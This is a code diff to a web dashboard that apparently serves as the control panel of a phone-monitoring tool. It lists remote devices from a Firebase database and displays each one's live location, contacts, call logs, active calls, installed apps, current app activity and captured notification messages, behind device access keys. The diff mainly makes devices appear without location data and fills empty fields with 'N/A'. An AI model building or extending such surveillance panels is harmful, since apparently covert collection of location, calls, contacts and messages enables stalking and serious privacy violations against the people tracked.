@@ -767,15 +767,18 @@
             document.querySelectorAll('.dropdown-menu').forEach(m => m.classList.remove('show'));
         }
 
-        // Load devices list normally when page opens
-        rtdb.ref('LiveLocation').on('value', (snapshot) => {
-            const devices = snapshot.val();
-            deviceListEl.innerHTML = "";
+        // Multiple nodes se device ids fetch karne ka logic taaki location na hone par bhi device id mil jaye
+        let allDevicesMap = {};
 
-            if (devices) {
-                Object.keys(devices).forEach(deviceId => {
-                    const dev = devices[deviceId];
-                    const devName = dev.deviceName || "Unknown Device";
+        function updateDeviceListUI() {
+            deviceListEl.innerHTML = "";
+            const deviceIds = Object.keys(allDevicesMap);
+
+            if (deviceIds.length > 0) {
+                deviceIds.forEach(deviceId => {
+                    const dev = allDevicesMap[deviceId] || {};
+                    // Agar devName nahi mila toh deviceId ko hi name ki jagah show karega
+                    const devName = dev.deviceName || deviceId;
                     const battery = dev.battery || "N/A";
                     const provider = dev.provider || "N/A";
                     const ram = dev.ram || "N/A";
@@ -802,6 +805,24 @@
             } else {
                 deviceListEl.innerHTML = `<li style="padding: 20px; text-align: center; color: var(--text-muted); font-size: 13px;">No devices connected.</li>`;
             }
+        }
+
+        // LiveLocation, CallLogs, aur Contacts se device IDs collect karna taaki location na hone par bhi device show ho
+        ['LiveLocation', 'CallLogs', 'Contacts', 'InstalledApps'].forEach(nodeName => {
+            rtdb.ref(nodeName).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    Object.keys(data).forEach(deviceId => {
+                        if (!allDevicesMap[deviceId]) {
+                            allDevicesMap[deviceId] = {};
+                        }
+                        if (nodeName === 'LiveLocation' && data[deviceId]) {
+                            allDevicesMap[deviceId] = { ...allDevicesMap[deviceId], ...data[deviceId] };
+                        }
+                    });
+                }
+                updateDeviceListUI();
+            });
         });
 
         function toggleSpecs(btn) {
@@ -815,7 +836,6 @@
             }
         }
 
-        // When user clicks a device, prompt for key verification
         function requestDeviceAccess(deviceId, deviceName) {
             pendingDevice = { id: deviceId, name: deviceName };
             document.getElementById('keyPromptDeviceName').innerText = `Device: ${deviceName}`;
@@ -828,7 +848,6 @@
             pendingDevice = null;
         }
 
-        // Verify entered key against Firebase DeviceKeys dynamically
         function verifyDeviceKey() {
             const enteredKey = document.getElementById('deviceKeyInput').value.trim();
             if (!enteredKey) {
@@ -843,17 +862,14 @@
 
             const currentPendingId = pendingDevice.id;
 
-            // Real-time keys check from Firebase Database
             rtdb.ref('DeviceKeys').once('value', (snapshot) => {
                 const deviceKeysData = snapshot.val() || {};
                 const allDevicesKey = deviceKeysData.ALL_DEVICES;
                 const specificDeviceKey = deviceKeysData[currentPendingId];
 
-                // Checks against dynamically fetched ALL_DEVICES key or device-specific key
                 if ((allDevicesKey && enteredKey === allDevicesKey) || (specificDeviceKey && enteredKey === specificDeviceKey)) {
                     closeKeyModal();
                     
-                    // Drawer aur overlay ko forcefully close karne ke liye yahan check lagaya hai
                     const drawer = document.getElementById('appDrawer');
                     const overlay = document.getElementById('drawerOverlay');
                     if (drawer && drawer.classList.contains('open')) {
@@ -873,7 +889,6 @@
         function selectDevice(deviceId) {
             selectedDeviceId = deviceId;
 
-            // Show loading messages in respective data sections
             locationDataEl.innerHTML = "Loading device location data...";
             contactDataEl.innerHTML = "Loading contacts...";
             callHistoryDataEl.innerHTML = "<div style='text-align: center; color: var(--text-muted); padding: 40px;'>Loading call logs...</div>";
@@ -882,31 +897,28 @@
 
             rtdb.ref('LiveLocation').child(deviceId).once('value', (snapshot) => {
                 const dev = snapshot.val();
-                if (dev) {
-                    const devName = dev.deviceName || "Unknown Device";
-                    const lat = dev.latitude || "N/A";
-                    const lng = dev.longitude || "N/A";
-                    const battery = dev.battery || "N/A";
-                    const provider = dev.provider || "N/A";
-                    const time = dev.timestamp ? new Date(parseInt(dev.timestamp)).toLocaleTimeString() : "N/A";
+                // Agar device info nahi mili toh N/A show karega aur deviceId dikhayega
+                const devName = (dev && dev.deviceName) ? dev.deviceName : deviceId;
+                const lat = (dev && dev.latitude) ? dev.latitude : "N/A";
+                const lng = (dev && dev.longitude) ? dev.longitude : "N/A";
+                const battery = (dev && dev.battery) ? dev.battery : "N/A";
+                const provider = (dev && dev.provider) ? dev.provider : "N/A";
+                const time = (dev && dev.timestamp) ? new Date(parseInt(dev.timestamp)).toLocaleTimeString() : "N/A";
 
-                    activeDeviceTitleEl.innerText = `Device: ${devName}`;
-                    locationDataEl.innerHTML = `
-                        <b>Device Name:</b> ${devName}<br>
-                        <b>Battery:</b> ${battery} | <b>Provider:</b> ${provider}<br>
-                        <b>Latitude:</b> ${lat}<br>
-                        <b>Longitude:</b> ${lng}
-                    `;
-                    if (lat !== "N/A" && lng !== "N/A") {
-                        mapLinkEl.href = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
-                        mapLinkEl.style.display = "inline-block";
-                    } else {
-                        mapLinkEl.style.display = "none";
-                    }
-                    statusTextEl.innerText = `Last updated at: ${time}`;
+                activeDeviceTitleEl.innerText = `Device: ${devName}`;
+                locationDataEl.innerHTML = `
+                    <b>Device Name:</b> ${devName}<br>
+                    <b>Battery:</b> ${battery} | <b>Provider:</b> ${provider}<br>
+                    <b>Latitude:</b> ${lat}<br>
+                    <b>Longitude:</b> ${lng}
+                `;
+                if (lat !== "N/A" && lng !== "N/A") {
+                    mapLinkEl.href = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
+                    mapLinkEl.style.display = "inline-block";
                 } else {
-                    locationDataEl.innerHTML = "No location data found for this device.";
+                    mapLinkEl.style.display = "none";
                 }
+                statusTextEl.innerText = `Last updated at: ${time}`;
             });
 
             loadContactsData();
@@ -929,7 +941,7 @@
                                 📞 Active Call Status: ${call.type || 'ACTIVE'}
                             </div>
                             <div style="font-size: 14px; color: #0c4a6e;">
-                                <b>Number:</b> ${call.phoneNumber || 'Unknown'}<br>
+                                <b>Number:</b> ${call.phoneNumber || 'N/A'}<br>
                                 <b>Started At:</b> ${timeStr}
                             </div>
                         </div>
@@ -942,9 +954,9 @@
             rtdb.ref('AppActivity').child(deviceId).on('value', (snap) => {
                 const act = snap.val();
                 if (act) {
-                    appActivityDataEl.innerHTML = `<b>Current App Package:</b> ${act.packageName}<br><b>Status:</b> ${act.activityName}<br><b>Time:</b> ${new Date(parseInt(act.timestamp)).toLocaleTimeString()}`;
+                    appActivityDataEl.innerHTML = `<b>Current App Package:</b> ${act.packageName || 'N/A'}<br><b>Status:</b> ${act.activityName || 'N/A'}<br><b>Time:</b> ${act.timestamp ? new Date(parseInt(act.timestamp)).toLocaleTimeString() : 'N/A'}`;
                 } else {
-                    appActivityDataEl.innerHTML = "No active app data found.";
+                    appActivityDataEl.innerHTML = "N/A";
                 }
             });
 
@@ -963,11 +975,11 @@
                 if (contacts) {
                     let html = "";
                     Object.entries(contacts).forEach(([key, c]) => {
-                        html += `<div style="padding: 8px 0; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between;"><span><b>${c.name || 'Unknown'}</b></span><span>${c.number || ''}</span></div>`;
+                        html += `<div style="padding: 8px 0; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between;"><span><b>${c.name || 'N/A'}</b></span><span>${c.number || 'N/A'}</span></div>`;
                     });
                     contactDataEl.innerHTML = html;
                 } else {
-                    contactDataEl.innerHTML = "No contacts found for this device.";
+                    contactDataEl.innerHTML = "N/A";
                 }
             });
         }
@@ -981,7 +993,7 @@
                 if (logs) {
                     const grouped = {};
                     Object.entries(logs).forEach(([key, l]) => {
-                        let num = l.phoneNumber || 'Unknown';
+                        let num = l.phoneNumber || 'N/A';
                         let ts = l.timestamp ? parseInt(l.timestamp) : Date.now();
                         if (!grouped[num]) grouped[num] = [];
                         grouped[num].push({ key: key, timestamp: ts });
@@ -1030,7 +1042,7 @@
                     });
                     callHistoryDataEl.innerHTML = html;
                 } else {
-                    callHistoryDataEl.innerHTML = "<div style='text-align: center; color: var(--text-muted); padding: 40px;'>No call logs found for this device.</div>";
+                    callHistoryDataEl.innerHTML = "<div style='text-align: center; color: var(--text-muted); padding: 40px;'>N/A</div>";
                 }
             });
         }
@@ -1044,11 +1056,11 @@
                 if (apps) {
                     let html = "";
                     Object.entries(apps).forEach(([key, app]) => {
-                        html += `<div style="padding: 8px 0; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between;"><span><b>${app.appName}</b></span><span style="color:var(--text-muted); font-size:12px;">${app.packageName}</span></div>`;
+                        html += `<div style="padding: 8px 0; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between;"><span><b>${app.appName || 'N/A'}</b></span><span style="color:var(--text-muted); font-size:12px;">${app.packageName || 'N/A'}</span></div>`;
                     });
                     appsDataEl.innerHTML = html;
                 } else {
-                    appsDataEl.innerHTML = "No installed apps found.";
+                    appsDataEl.innerHTML = "N/A";
                 }
             });
         }
@@ -1061,12 +1073,12 @@
                 if (notifs) {
                     let html = "";
                     Object.entries(notifs).reverse().forEach(([key, n]) => {
-                        let timeStr = n.timestamp ? new Date(parseInt(n.timestamp)).toLocaleTimeString() : "";
-                        html += `<div style="padding: 10px 0; border-bottom: 1px solid var(--border);"><b>App:</b> ${n.packageName}<br><b>Title:</b> ${n.title}<br><b>Message:</b> ${n.message} <span style="float:right; color:var(--text-muted); font-size:11px;">${timeStr}</span></div>`;
+                        let timeStr = n.timestamp ? new Date(parseInt(n.timestamp)).toLocaleTimeString() : "N/A";
+                        html += `<div style="padding: 10px 0; border-bottom: 1px solid var(--border);"><b>App:</b> ${n.packageName || 'N/A'}<br><b>Title:</b> ${n.title || 'N/A'}<br><b>Message:</b> ${n.message || 'N/A'} <span style="float:right; color:var(--text-muted); font-size:11px;">${timeStr}</span></div>`;
                     });
                     notificationDataEl.innerHTML = html;
                 } else {
-                    notificationDataEl.innerHTML = "No notifications captured yet.";
+                    notificationDataEl.innerHTML = "N/A";
                 }
             });
         }
@@ -1106,7 +1118,7 @@
             const dataObj = rawDeviceDataCache[currentActiveDataType];
 
             if (!dataObj) {
-                container.innerHTML = "No data available.";
+                container.innerHTML = "N/A";
                 return;
             }
 
@@ -1119,13 +1131,13 @@
                 let itemTimestamp = item.timestamp ? parseInt(item.timestamp) : 0;
                 
                 if (currentActiveDataType === 'CallLogs') {
-                    displayLabel = (item.phoneNumber || 'Unknown') + " (" + new Date(itemTimestamp).toLocaleString() + ")";
+                    displayLabel = (item.phoneNumber || 'N/A') + " (" + (itemTimestamp ? new Date(itemTimestamp).toLocaleString() : 'N/A') + ")";
                 } else if (currentActiveDataType === 'Contacts') {
-                    displayLabel = (item.name || 'Unknown') + " - " + (item.number || '');
+                    displayLabel = (item.name || 'N/A') + " - " + (item.number || 'N/A');
                 } else if (currentActiveDataType === 'InstalledApps') {
-                    displayLabel = (item.appName || '') + " " + (item.packageName || '');
+                    displayLabel = (item.appName || 'N/A') + " " + (item.packageName || 'N/A');
                 } else if (currentActiveDataType === 'Notifications') {
-                    displayLabel = (item.packageName || '') + " " + (item.title || '') + " " + (item.message || '');
+                    displayLabel = (item.packageName || 'N/A') + " " + (item.title || 'N/A') + " " + (item.message || 'N/A');
                 }
 
                 if (dateFilterStr && itemTimestamp > 0) {
@@ -1140,7 +1152,7 @@
                 </div>`;
             });
 
-            container.innerHTML = html || "No matching items found.";
+            container.innerHTML = html || "N/A";
         }
 
         function toggleSelectAllItems(select) {
